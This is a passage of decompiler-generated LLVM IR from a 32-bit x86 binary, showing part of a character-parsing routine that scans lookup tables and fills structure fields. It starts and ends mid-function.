  %v0_804c6fb.pre.pre.pre = phi i32 [ %v1_804c6c0, %dec_label_pc_804c6bd ], [ %v0_804c6fb.pre.pre.pre.pre, %dec_label_pc_804c6b1 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_804c6cd

dec_label_pc_804c6cd:                             ; preds = %dec_label_pc_804c694, %dec_label_pc_804c6c8
  %v0_804c6fb.pre.pre = phi i32 [ %v1_804c6c0, %dec_label_pc_804c694 ], [ %v0_804c6fb.pre.pre.pre, %dec_label_pc_804c6c8 ]
  %v0_804c566 = phi i32 [ %v0_804c6b7, %dec_label_pc_804c694 ], [ -2147483648, %dec_label_pc_804c6c8 ]
  %v4_804c6cd = trunc i64 %stack_var_-92.1.ph to i32
  %v5_804c6cd = icmp eq i32 %v4_804c6cd, 0
  %v1_804c6d2 = icmp eq i1 %v5_804c6cd, false
  %.pre = inttoptr i32 %v0_804c6fb.pre.pre to i8*
  br i1 %v1_804c6d2, label %dec_label_pc_804c6f6, label %dec_label_pc_804c6d8

dec_label_pc_804c6d8:                             ; preds = %dec_label_pc_804c6cd
  %v2_804c6d8 = load i8, i8* %.pre, align 1
  %v11_804c6d8 = icmp eq i8 %v2_804c6d8, 46
  %v1_804c6db = icmp eq i1 %v11_804c6d8, false
  br i1 %v1_804c6db, label %dec_label_pc_804c6ef, label %dec_label_pc_804c6dd

dec_label_pc_804c6dd:                             ; preds = %dec_label_pc_804c6d8
  %v1_804c6dd = add i32 %v0_804c6fb.pre.pre, 1
  store i32 %v1_804c6dd, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_804c5c0.outer

dec_label_pc_804c6ef:                             ; preds = %dec_label_pc_804c6d8
  br label %dec_label_pc_804c6f6

dec_label_pc_804c6f6:                             ; preds = %dec_label_pc_804c6cd, %dec_label_pc_804c6ef
  %stack_var_-96.2 = phi i32 [ %v0_804c566, %dec_label_pc_804c6ef ], [ %stack_var_-96.1.ph, %dec_label_pc_804c6cd ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_804c6ef ], [ %v0_804c566, %dec_label_pc_804c6cd ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_8053044.127 to i32), i32* @edx, align 4
  %v4_804c6fb.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c6fb

dec_label_pc_804c6fb:                             ; preds = %dec_label_pc_804c705, %dec_label_pc_804c6f6
  %v0_804c705 = phi i32 [ %v1_804c705, %dec_label_pc_804c705 ], [ ptrtoint ([9 x i8]* @global_var_8053044.127 to i32), %dec_label_pc_804c6f6 ]
  %v4_804c6fb = phi i32 [ %v6_804c6fb, %dec_label_pc_804c705 ], [ %v4_804c6fb.pre, %dec_label_pc_804c6f6 ]
  %v2_804c6fb = load i8, i8* %.pre, align 1
  %v3_804c6fb = zext i8 %v2_804c6fb to i32
  %v5_804c6fb = and i32 %v4_804c6fb, -256
  %v6_804c6fb = or i32 %v3_804c6fb, %v5_804c6fb
  store i32 %v6_804c6fb, i32* %eax.global-to-local, align 4
  %v3_804c6fd = inttoptr i32 %v0_804c705 to i8*
  %v4_804c6fd = load i8, i8* %v3_804c6fd, align 1
  %v15_804c6fd = icmp eq i8 %v2_804c6fb, %v4_804c6fd
  br i1 %v15_804c6fd, label %dec_label_pc_804c56d, label %dec_label_pc_804c705

dec_label_pc_804c705:                             ; preds = %dec_label_pc_804c6fb
  %v1_804c705 = add i32 %v0_804c705, 1
  store i32 %v1_804c705, i32* @edx, align 4
  %v1_804c706 = inttoptr i32 %v1_804c705 to i8*
  %v2_804c706 = load i8, i8* %v1_804c706, align 1
  %v3_804c706 = icmp eq i8 %v2_804c706, 0
  %v1_804c709 = icmp eq i1 %v3_804c706, false
  br i1 %v1_804c709, label %dec_label_pc_804c6fb, label %dec_label_pc_804c70b

dec_label_pc_804c70b:                             ; preds = %dec_label_pc_804c705, %dec_label_pc_804c56d
  %v0_804c71e = phi i32 [ %v1_804c56d, %dec_label_pc_804c56d ], [ %v0_804c6fb.pre.pre, %dec_label_pc_804c705 ]
  %v0_804c71b = phi i32 [ %v0_804c705, %dec_label_pc_804c56d ], [ %v1_804c705, %dec_label_pc_804c705 ]
  %v1_804c70d = add i32 %v0_804c71b, -134557764
  %v1_804c712 = add i32 %v0_804c71b, -134557765
  %v5_804c712 = sub i32 134557764, %v0_804c71b
  %v6_804c712 = and i32 %v1_804c70d, %v5_804c712
  %v7_804c712 = icmp slt i32 %v6_804c712, 0
  %v8_804c712 = icmp eq i32 %v1_804c712, 0
  %v9_804c712 = icmp slt i32 %v1_804c712, 0
  store i32 %v1_804c712, i32* %eax.global-to-local, align 4
  %v3_804c713 = icmp eq i1 %v9_804c712, %v7_804c712
  %v4_804c713 = icmp eq i1 %v8_804c712, false
  %v5_804c713 = and i1 %v4_804c713, %v3_804c713
  br i1 %v5_804c713, label %dec_label_pc_804c71f, label %dec_label_pc_804c715

dec_label_pc_804c715:                             ; preds = %dec_label_pc_804c70b
  %v1_804c715 = inttoptr i32 %v0_804c71e to i8*
  %v2_804c715 = load i8, i8* %v1_804c715, align 1
  %v3_804c715 = zext i8 %v2_804c715 to i32
  %v5_804c715 = and i32 %v1_804c712, -256
  %v6_804c715 = or i32 %v3_804c715, %v5_804c715
  store i32 %v6_804c715, i32* %eax.global-to-local, align 4
  %v3_804c717 = inttoptr i32 %v0_804c71b to i8*
  %v4_804c717 = load i8, i8* %v3_804c717, align 1
  %v15_804c717 = icmp eq i8 %v2_804c715, %v4_804c717
  %v1_804c719 = icmp eq i1 %v15_804c717, false
  br i1 %v1_804c719, label %dec_label_pc_804c71f, label %dec_label_pc_804c71b

dec_label_pc_804c71b:                             ; preds = %dec_label_pc_804c715
  %v1_804c71b = add i32 %v0_804c71b, 9
  store i32 %v1_804c71b, i32* @edx, align 4
  %v1_804c71e = add i32 %v0_804c71e, 1
  store i32 %v1_804c71e, i32* @esi, align 4
  br label %dec_label_pc_804c71f

dec_label_pc_804c71f:                             ; preds = %dec_label_pc_804c715, %dec_label_pc_804c70b, %dec_label_pc_804c71b
  %v4_804c726 = phi i32 [ %v6_804c715, %dec_label_pc_804c715 ], [ %v1_804c712, %dec_label_pc_804c70b ], [ %v6_804c715, %dec_label_pc_804c71b ]
  %v0_804c726 = phi i32 [ %v0_804c71e, %dec_label_pc_804c715 ], [ %v0_804c71e, %dec_label_pc_804c70b ], [ %v1_804c71e, %dec_label_pc_804c71b ]
  %v0_804c71f = phi i32 [ %v0_804c71b, %dec_label_pc_804c715 ], [ %v0_804c71b, %dec_label_pc_804c70b ], [ %v1_804c71b, %dec_label_pc_804c71b ]
  %v1_804c71f = add i32 %v0_804c71f, 9
  %v2_804c71f = inttoptr i32 %v1_804c71f to i8*
  %v3_804c71f = load i8, i8* %v2_804c71f, align 1
  %v4_804c71f = sext i8 %v3_804c71f to i32
  %v2_804c723 = mul nsw i32 %v4_804c71f, 256
  store i32 %v2_804c723, i32* %ebx.global-to-local, align 4
  %v1_804c726 = inttoptr i32 %v0_804c726 to i8*
  %v2_804c726 = load i8, i8* %v1_804c726, align 1
  %v3_804c726 = zext i8 %v2_804c726 to i32
  %v5_804c726 = and i32 %v4_804c726, -256
  %v6_804c726 = or i32 %v3_804c726, %v5_804c726
  store i32 %v6_804c726, i32* %eax.global-to-local, align 4
  %v4_804c728 = icmp eq i8 %v2_804c726, 0
  br i1 %v4_804c728, label %dec_label_pc_804c8dc, label %dec_label_pc_804c730

dec_label_pc_804c730:                             ; preds = %dec_label_pc_804c71f
  store i32 ptrtoint ([21 x i8]* @global_var_8053081.128 to i32), i32* %ecx.global-to-local, align 4
  %v3_804c735 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804c735, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c739

dec_label_pc_804c739:                             ; preds = %dec_label_pc_804c788, %dec_label_pc_804c730
  %v0_804c788 = phi i32 [ %v1_804c788, %dec_label_pc_804c788 ], [ ptrtoint ([21 x i8]* @global_var_8053081.128 to i32), %dec_label_pc_804c730 ]
  %v3_804c739 = inttoptr i32 %v0_804c788 to i8*
  %v4_804c739 = load i8, i8* %v3_804c739, align 1
  %v15_804c739 = icmp eq i8 %v2_804c726, %v4_804c739
  %v1_804c73b = icmp eq i1 %v15_804c739, false
  br i1 %v1_804c73b, label %dec_label_pc_804c788, label %dec_label_pc_804c73d

dec_label_pc_804c73d:                             ; preds = %dec_label_pc_804c739
  %v1_804c73f = add i32 %v0_804c788, -134557825
  store i32 %v1_804c73f, i32* %edx.global-to-local, align 4
  %v7_804c748 = icmp sgt i32 %v1_804c73f, 17
  br i1 %v7_804c748, label %dec_label_pc_804c74a, label %dec_label_pc_804c752

dec_label_pc_804c74a:                             ; preds = %dec_label_pc_804c73d
  %v3_804c74a = and i32 %v2_804c723, 1024
  %v4_804c74a = icmp eq i32 %v3_804c74a, 0
  br i1 %v4_804c74a, label %dec_label_pc_804c752, label %dec_label_pc_804c74f

dec_label_pc_804c74f:                             ; preds = %dec_label_pc_804c74a
  %v1_804c74f = add i32 %v0_804c788, -134557827
  store i32 %v1_804c74f, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c752

dec_label_pc_804c752:                             ; preds = %dec_label_pc_804c73d, %dec_label_pc_804c74a, %dec_label_pc_804c74f
  %v0_804c75b = phi i32 [ %v1_804c73f, %dec_label_pc_804c73d ], [ %v1_804c73f, %dec_label_pc_804c74a ], [ %v1_804c74f, %dec_label_pc_804c74f ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_8053077.129 to i32), i32* %ecx.global-to-local, align 4
  %v2_804c75b = add i32 %tmp76, 32
  %v3_804c75b = inttoptr i32 %v2_804c75b to i32*
  store i32 %v0_804c75b, i32* %v3_804c75b, align 4
  %v0_804c75e.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804c762.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804c75e

dec_label_pc_804c75e:                             ; preds = %dec_label_pc_804c75e, %dec_label_pc_804c752
  %v0_804c75e = phi i32 [ %v1_804c75e, %dec_label_pc_804c75e ], [ %v0_804c75e.pre, %dec_label_pc_804c752 ]
  %v1_804c75e = add i32 %v0_804c75e, 1
  store i32 %v1_804c75e, i32* %ecx.global-to-local, align 4
  %v1_804c75f = inttoptr i32 %v1_804c75e to i8*
  %v2_804c75f = load i8, i8* %v1_804c75f, align 1
  %v3_804c75f = sext i8 %v2_804c75f to i32
  store i32 %v3_804c75f, i32* %eax.global-to-local, align 4
  %v8_804c764 = icmp sgt i32 %v0_804c762.pre, %v3_804c75f
  br i1 %v8_804c764, label %dec_label_pc_804c75e, label %dec_label_pc_804c766

dec_label_pc_804c766:                             ; preds = %dec_label_pc_804c75e
  store i32 ptrtoint ([21 x i8]* @global_var_8053081.128 to i32), i32* @ecx, align 4
  %v1_804c76d = add i32 %v0_804c75e, -134557815
  store i32 %v1_804c76d, i32* %eax.global-to-local, align 4
  %v2_804c772 = add i32 %v0_804c75e, add (i32 ptrtoint (i32* @global_var_8053068.130 to i32), i32 -134557815)
  %v3_804c772 = add i32 %v2_804c772, %v1_804c76d
  %v4_804c772 = inttoptr i32 %v3_804c772 to i16*
  %v5_804c772 = load i16, i16* %v4_804c772, align 2
  %v6_804c772 = sext i16 %v5_804c772 to i32
  store i32 %v6_804c772, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_804c76d, 2
  %v3_804c77a = add i32 %factor, 134557784
  %v4_804c77a = inttoptr i32 %v3_804c77a to i16*
  %v5_804c77a = load i16, i16* %v4_804c77a, align 2
  %v6_804c77a = sext i16 %v5_804c77a to i32
  store i32 %v6_804c77a, i32* %eax.global-to-local, align 4
  %v1_804c782 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804c782 = or i32 %v1_804c782, %v6_804c772
  %v2_804c784 = and i32 %v2_804c782, %v6_804c77a
  store i32 %v2_804c784, i32* %edx.global-to-local, align 4
  %v0_804c796.pre = load i32, i32* @esi, align 4
  %v0_804c799.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804c78e

dec_label_pc_804c788:                             ; preds = %dec_label_pc_804c739
  %v1_804c788 = add i32 %v0_804c788, 1
  store i32 %v1_804c788, i32* @ecx, align 4
  %v1_804c789 = inttoptr i32 %v1_804c788 to i8*
  %v2_804c789 = load i8, i8* %v1_804c789, align 1
  %v3_804c789 = icmp eq i8 %v2_804c789, 0
  %v1_804c78c = icmp eq i1 %v3_804c789, false
  br i1 %v1_804c78c, label %dec_label_pc_804c739, label %dec_label_pc_804c78e

dec_label_pc_804c78e:                             ; preds = %dec_label_pc_804c788, %dec_label_pc_804c766
  %v0_804c799 = phi i32 [ %v0_804c799.pre, %dec_label_pc_804c766 ], [ %storemerge4, %dec_label_pc_804c788 ]
  %v0_804c796 = phi i32 [ %v0_804c796.pre, %dec_label_pc_804c766 ], [ %v0_804c726, %dec_label_pc_804c788 ]
  %v0_804c78e = phi i32 [ %v2_804c784, %dec_label_pc_804c766 ], [ %v3_804c735, %dec_label_pc_804c788 ]
  store i32 %v0_804c78e, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804c796 = inttoptr i32 %v0_804c796 to i8*
  %v2_804c796 = load i8, i8* %v1_804c796, align 1
  %v3_804c796 = sext i8 %v2_804c796 to i32
  store i32 %v3_804c796, i32* %eax.global-to-local, align 4
  %v2_804c799 = add i32 %tmp76, 4
  %v3_804c799 = inttoptr i32 %v2_804c799 to i32*
  store i32 %v0_804c799, i32* %v3_804c799, align 4
  %v0_804c79c = load i32, i32* %eax.global-to-local, align 4
  %v1_804c79c = load i32, i32* @edx, align 4
  %v2_804c79c = add i32 %v1_804c79c, 12
  %v3_804c79c = inttoptr i32 %v2_804c79c to i32*
  store i32 %v0_804c79c, i32* %v3_804c79c, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_804c7a3 = load i32, i32* @edx, align 4
  %v1_804c7a3 = add i32 %v0_804c7a3, 28
  %v2_804c7a3 = inttoptr i32 %v1_804c7a3 to i32*
  store i32 1, i32* %v2_804c7a3, align 4
  %v0_804c7aa = load i32, i32* %eax.global-to-local, align 4
  %v1_804c7aa = load i32, i32* @edx, align 4
  %v2_804c7aa = add i32 %v1_804c7aa, 8
  %v3_804c7aa = inttoptr i32 %v2_804c7aa to i32*
  store i32 %v0_804c7aa, i32* %v3_804c7aa, align 4
  %v0_804c7ad = load i32, i32* %edi.global-to-local, align 4
  %v1_804c7b7 = and i32 %v0_804c7ad, -5
  %v0_804c7bd = load i32, i32* %ebx.global-to-local, align 4
  %v1_804c7bd = and i32 %v0_804c7bd, 3840
  store i32 %v1_804c7bd, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_804c7c6 = or i32 %v1_804c7bd, %v1_804c7b7
  store i32 %v2_804c7c6, i32* @edi, align 4
  %v1_804c7c8 = load i32, i32* @edx, align 4
  %v2_804c7c8 = add i32 %v1_804c7c8, 20
  %v3_804c7c8 = inttoptr i32 %v2_804c7c8 to i32*
  store i32 48, i32* %v3_804c7c8, align 4
  %v0_804c7cb = load i32, i32* @edi, align 4
  %v1_804c7cb = load i32, i32* @edx, align 4
  %v2_804c7cb = add i32 %v1_804c7cb, 16
  %v3_804c7cb = inttoptr i32 %v2_804c7cb to i32*
  store i32 %v0_804c7cb, i32* %v3_804c7cb, align 4
  %v0_804c7ce = load i32, i32* @ecx, align 4
  %v1_804c7ce = inttoptr i32 %v0_804c7ce to i8*
  %v2_804c7ce = load i8, i8* %v1_804c7ce, align 1
  %v3_804c7ce = icmp eq i8 %v2_804c7ce, 0
  %v1_804c7d1 = icmp eq i1 %v3_804c7ce, false
  br i1 %v1_804c7d1, label %dec_label_pc_804c7ea, label %dec_label_pc_804c7d3

dec_label_pc_804c7d3:                             ; preds = %dec_label_pc_804c78e
  %v0_804c7d3 = load i32, i32* @esi, align 4
  %v1_804c7d3 = inttoptr i32 %v0_804c7d3 to i8*
  %v2_804c7d3 = load i8, i8* %v1_804c7d3, align 1
  %v11_804c7d3 = icmp eq i8 %v2_804c7d3, 109
  %v1_804c7d6 = icmp eq i1 %v11_804c7d3, false
  br i1 %v1_804c7d6, label %dec_label_pc_804c8dc, label %dec_label_pc_804c7dc

dec_label_pc_804c7dc:                             ; preds = %dec_label_pc_804c7d3
  %v0_804c7dc = load i32, i32* @edx, align 4
  %v1_804c7dc = add i32 %v0_804c7dc, 32
  %v2_804c7dc = inttoptr i32 %v1_804c7dc to i32*
  store i32 20, i32* %v2_804c7dc, align 4
  %v0_804c7e3 = load i32, i32* @edx, align 4
  %v1_804c7e3 = add i32 %v0_804c7e3, 28
  %v2_804c7e3 = inttoptr i32 %v1_804c7e3 to i32*
  store i32 0, i32* %v2_804c7e3, align 4
  br label %dec_label_pc_804c7ea

dec_label_pc_804c7ea:                             ; preds = %dec_label_pc_804c78e, %dec_label_pc_804c7dc
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_804c87e, label %dec_label_pc_804c7f5

dec_label_pc_804c7f5:                             ; preds = %dec_label_pc_804c7ea
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_804c836 = add i32 %tmp76, 40
  %v1_804c86f = add i32 %tmp76, 28
  %v2_804c86f = inttoptr i32 %v1_804c86f to i32*
  %v4_804c804 = add i32 %tmp76, 36
  br label %dec_label_pc_804c7f7

dec_label_pc_804c7f7:                             ; preds = %dec_label_pc_804c86a, %dec_label_pc_804c7f5
  %v0_804c80d = phi i32 [ 0, %dec_label_pc_804c7f5 ], [ %v1_804c86e, %dec_label_pc_804c86a ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804c7f5 ], [ %stack_var_-88.5, %dec_label_pc_804c86a ]
  %v1_804c7f7 = add i32 %v0_804c80d, -2
  %v6_804c7f7 = sub i32 1, %v0_804c80d
  %v7_804c7f7 = and i32 %v6_804c7f7, %v0_804c80d
  %v8_804c7f7 = icmp slt i32 %v7_804c7f7, 0
  %v9_804c7f7 = icmp eq i32 %v1_804c7f7, 0
  %v10_804c7f7 = icmp slt i32 %v1_804c7f7, 0
  %v3_804c7fa = icmp eq i1 %v10_804c7f7, %v8_804c7f7
  %v4_804c7fa = icmp eq i1 %v9_804c7f7, false
  %v5_804c7fa = and i1 %v4_804c7fa, %v3_804c7fa
  br i1 %v5_804c7fa, label %dec_label_pc_804c80d, label %dec_label_pc_804c7fc

dec_label_pc_804c7fc:                             ; preds = %dec_label_pc_804c7f7
  store i32 %tmp76, i32* @edx, align 4
  %v0_804c800 = load i32, i32* @esp, align 4
  %v2_804c800 = mul i32 %v0_804c80d, 4
  %v3_804c800 = add i32 %v2_804c800, 68
  %v4_804c800 = add i32 %v3_804c800, %v0_804c800
  %v5_804c800 = inttoptr i32 %v4_804c800 to i32*
  %v6_804c800 = load i32, i32* %v5_804c800, align 4
  store i32 %v6_804c800, i32* %eax.global-to-local, align 4
  %v1_804c804 = trunc i32 %v6_804c800 to i8
  %v5_804c804 = add i32 %v4_804c804, %v0_804c80d
  %v6_804c804 = inttoptr i32 %v5_804c804 to i8*
  store i8 %v1_804c804, i8* %v6_804c804, align 1
  %v0_804c808 = load i32, i32* %eax.global-to-local, align 4
  %v1_804c808 = urem i32 %v0_804c808, 256
  br label %dec_label_pc_804c816

dec_label_pc_804c80d:                             ; preds = %dec_label_pc_804c7f7
  %v5_804c80f = add i32 %v0_804c80d, %stack_var_-32.3
  store i32 %v5_804c80f, i32* %eax.global-to-local, align 4
  %v1_804c813 = add i32 %v5_804c80f, -2
  br label %dec_label_pc_804c816

dec_label_pc_804c816:                             ; preds = %dec_label_pc_804c7fc, %dec_label_pc_804c80d
  %v0_804c829 = phi i32 [ %v1_804c808, %dec_label_pc_804c7fc ], [ %v1_804c813, %dec_label_pc_804c80d ]
  store i32 %v0_804c829, i32* %eax.global-to-local, align 4
  %v5_804c816 = sub i32 %v0_804c829, %stack_var_-88.4
  %v11_804c816 = xor i32 %v0_804c829, %stack_var_-88.4
  %v12_804c816 = xor i32 %v5_804c816, %v0_804c829
  %v13_804c816 = and i32 %v12_804c816, %v11_804c816
  %v14_804c816 = icmp slt i32 %v13_804c816, 0
  %v15_804c816 = icmp eq i32 %v5_804c816, 0
  %v16_804c816 = icmp slt i32 %v5_804c816, 0
  %v3_804c81a = icmp ne i1 %v16_804c816, %v14_804c816
  %v4_804c81a = or i1 %v15_804c816, %v3_804c81a
  br i1 %v4_804c81a, label %dec_label_pc_804c829, label %dec_label_pc_804c81c

dec_label_pc_804c81c:                             ; preds = %dec_label_pc_804c816
  %v1_804c81c = add i32 %v0_804c829, -9
  %v6_804c81c = sub i32 8, %v0_804c829
  %v7_804c81c = and i32 %v6_804c81c, %v0_804c829
  %v8_804c81c = icmp slt i32 %v7_804c81c, 0
  %v9_804c81c = icmp eq i32 %v1_804c81c, 0
  %v10_804c81c = icmp slt i32 %v1_804c81c, 0
  %v3_804c81f = icmp eq i1 %v10_804c81c, %v8_804c81c
  %v4_804c81f = icmp eq i1 %v9_804c81c, false
  %v5_804c81f = and i1 %v4_804c81f, %v3_804c81f
  br i1 %v5_804c81f, label %dec_label_pc_804c8dc, label %dec_label_pc_804c829

dec_label_pc_804c829:                             ; preds = %dec_label_pc_804c81c, %dec_label_pc_804c816
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_804c816 ], [ %v0_804c829, %dec_label_pc_804c81c ]
  %v1_804c829 = add i32 %v0_804c829, -1
  store i32 %v1_804c829, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_804c832 = load i32, i32* @esp, align 4
  %v1_804c832 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804c832 = mul i32 %v1_804c832, 4
  %v3_804c832 = add i32 %v0_804c832, 80
  %v4_804c832 = add i32 %v3_804c832, %v2_804c832
  %v5_804c832 = inttoptr i32 %v4_804c832 to i32*
  %v6_804c832 = load i32, i32* %v5_804c832, align 4
  store i32 %v6_804c832, i32* %edi.global-to-local, align 4
  %v2_804c836 = mul i32 %v1_804c829, 4
  %v4_804c836 = add i32 %v3_804c836, %v2_804c836
  %v5_804c836 = inttoptr i32 %v4_804c836 to i32*
  %v6_804c836 = load i32, i32* %v5_804c836, align 4
  store i32 %v6_804c836, i32* @eax, align 4
  %v9_804c83a = icmp eq i32 %v6_804c832, 8
  br i1 %v9_804c83a, label %dec_label_pc_804c86a, label %dec_label_pc_804c83f

dec_label_pc_804c83f:                             ; preds = %dec_label_pc_804c829
  %v9_804c83f = icmp eq i32 %v6_804c836, 8
  br i1 %v9_804c83f, label %dec_label_pc_804c85a, label %dec_label_pc_804c844

dec_label_pc_804c844:                             ; preds = %dec_label_pc_804c83f
  %v12_804c844 = icmp eq i32 %v6_804c836, %v6_804c832
  br i1 %v12_804c844, label %dec_label_pc_804c85a, label %dec_label_pc_804c848

dec_label_pc_804c848:                             ; preds = %dec_label_pc_804c844
  %v1_804c848 = call i32 @function_804c4f8(i32 %v1_804c829)
  store i32 %v1_804c848, i32* %ebx.global-to-local, align 4
  %v0_804c84f = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804c84f, i32* @eax, align 4
  %v1_804c851 = call i32 @function_804c4f8(i32 %v1_804c829)
  store i32 %v1_804c851, i32* %eax.global-to-local, align 4
  %v8_804c858 = icmp sgt i32 %v1_804c848, %v1_804c851
  br i1 %v8_804c858, label %dec_label_pc_804c86a, label %dec_label_pc_804c848.dec_label_pc_804c85a_crit_edge

dec_label_pc_804c848.dec_label_pc_804c85a_crit_edge: ; preds = %dec_label_pc_804c848
  %v0_804c862.pre = load i32, i32* @esp, align 4
  %v1_804c862.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804c85a

dec_label_pc_804c85a:                             ; preds = %dec_label_pc_804c848.dec_label_pc_804c85a_crit_edge, %dec_label_pc_804c844, %dec_label_pc_804c83f
  %v1_804c862 = phi i32 [ %v1_804c862.pre, %dec_label_pc_804c848.dec_label_pc_804c85a_crit_edge ], [ %v1_804c832, %dec_label_pc_804c844 ], [ %v1_804c832, %dec_label_pc_804c83f ]
  %v0_804c862 = phi i32 [ %v0_804c862.pre, %dec_label_pc_804c848.dec_label_pc_804c85a_crit_edge ], [ %v0_804c832, %dec_label_pc_804c844 ], [ %v0_804c832, %dec_label_pc_804c83f ]
  store i32 %v1_804c829, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v2_804c862 = mul i32 %v1_804c862, 4
  %v3_804c862 = add i32 %v0_804c862, 80
  %v4_804c862 = add i32 %v3_804c862, %v2_804c862
  %v5_804c862 = inttoptr i32 %v4_804c862 to i32*
  %v6_804c862 = load i32, i32* %v5_804c862, align 4
  store i32 %v6_804c862, i32* %eax.global-to-local, align 4
  store i32 %v6_804c862, i32* %v5_804c836, align 4
  br label %dec_label_pc_804c86a

dec_label_pc_804c86a:                             ; preds = %dec_label_pc_804c848, %dec_label_pc_804c829, %dec_label_pc_804c85a
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804c86e = load i32, i32* %ebp.global-to-local, align 4
  %v1_804c86e = add i32 %v0_804c86e, 1
  store i32 %v1_804c86e, i32* %ebp.global-to-local, align 4
  %v3_804c86f = load i32, i32* %v2_804c86f, align 4
  %v1_804c872 = add i32 %v3_804c86f, 2
  store i32 %v1_804c872, i32* %eax.global-to-local, align 4
  %v5_804c877 = icmp slt i32 %v1_804c86e, %v1_804c872
  br i1 %v5_804c877, label %dec_label_pc_804c7f7, label %dec_label_pc_804c8a5

dec_label_pc_804c87e:                             ; preds = %dec_label_pc_804c7ea
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804c882 = add i32 %tmp76, 38
  %v2_804c882 = inttoptr i32 %v1_804c882 to i8*
  store i8 1, i8* %v2_804c882, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804c88b = add i32 %tmp76, 28
  %v2_804c88b = inttoptr i32 %v1_804c88b to i32*
  %v3_804c88b = load i32, i32* %v2_804c88b, align 4
  %v2_804c88e = mul i32 %v3_804c88b, 4
  %v2_804c892 = ptrtoint i32* %stack_var_-20 to i32
  %v1_804c899 = add i32 %tmp76, 40
  store i32 %v1_804c899, i32* %eax.global-to-local, align 4
  %v3_804c89d = inttoptr i32 %v1_804c899 to i16*
  %v4_804c89d = call i32 @function_804ce38(i16* %v3_804c89d, i32 %v2_804c892, i32 %v2_804c88e)
  store i32 %v4_804c89d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804c8a5

dec_label_pc_804c8a5:                             ; preds = %dec_label_pc_804c86a, %dec_label_pc_804c87e
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804c87e ], [ %stack_var_-88.5, %dec_label_pc_804c86a ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-88.6, i32* %v2_804c550, align 4
  %v0_804c8b0 = load i32, i32* @ecx, align 4
  %v1_804c8b0 = add i32 %v0_804c8b0, 16
  %v2_804c8b0 = inttoptr i32 %v1_804c8b0 to i8*
  %v3_804c8b0 = load i8, i8* %v2_804c8b0, align 1
  %v5_804c8b0 = icmp slt i8 %v3_804c8b0, 0
  br i1 %v5_804c8b0, label %dec_label_pc_804c8bd, label %dec_label_pc_804c8b6

dec_label_pc_804c8b6:                             ; preds = %dec_label_pc_804c8a5
  %v0_804c8b6 = load i32, i32* @esi, align 4
  %v1_804c8b6 = add i32 %v0_804c8b6, 1
  store i32 %v1_804c8b6, i32* %eax.global-to-local, align 4
  %v2_804c8b9 = inttoptr i32 %v0_804c8b0 to i32*
  store i32 %v1_804c8b6, i32* %v2_804c8b9, align 4
  br label %dec_label_pc_804c8d0

dec_label_pc_804c8bd:                             ; preds = %dec_label_pc_804c8a5
  store i32 %v4_804c524, i32* %edx.global-to-local, align 4
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804c8c5 = load i32, i32* @esi, align 4
  %v2_804c8c5 = sub i32 %v0_804c8c5, %v4_804c524
  store i32 %v2_804c8c5, i32* %esi.global-to-local, align 4
  %v1_804c8c7 = mul i32 %v2_804c8c5, 4
  %v2_804c8c7 = add i32 %v1_804c8c7, 224
  store i32 %v2_804c8c7, i32* %eax.global-to-local, align 4
  %v2_804c8ce = load i32, i32* %arg1, align 4
  %v4_804c8ce = add i32 %v2_804c8ce, %v2_804c8c7
  store i32 %v4_804c8ce, i32* %arg1, align 4
  br label %dec_label_pc_804c8d0

dec_label_pc_804c8d0:                             ; preds = %dec_label_pc_804c8b6, %dec_label_pc_804c8bd
  store i32 %tmp76, i32* @edx, align 4
  %v1_804c8d4 = add i32 %tmp76, 28
  %v2_804c8d4 = inttoptr i32 %v1_804c8d4 to i32*
  %v3_804c8d4 = load i32, i32* %v2_804c8d4, align 4
  store i32 %v3_804c8d4, i32* %eax.global-to-local, align 4
  %v1_804c8d7 = add i32 %v3_804c8d4, 2
  br label %dec_label_pc_804c8df

dec_label_pc_804c8dc:                             ; preds = %dec_label_pc_804c575, %dec_label_pc_804c60f, %dec_label_pc_804c642, %dec_label_pc_804c6bd, %dec_label_pc_804c6a9, %dec_label_pc_804c6a0, %dec_label_pc_804c81c, %dec_label_pc_804c7d3, %dec_label_pc_804c71f
  br label %dec_label_pc_804c8df

dec_label_pc_804c8df:                             ; preds = %dec_label_pc_804c8d0, %dec_label_pc_804c8dc
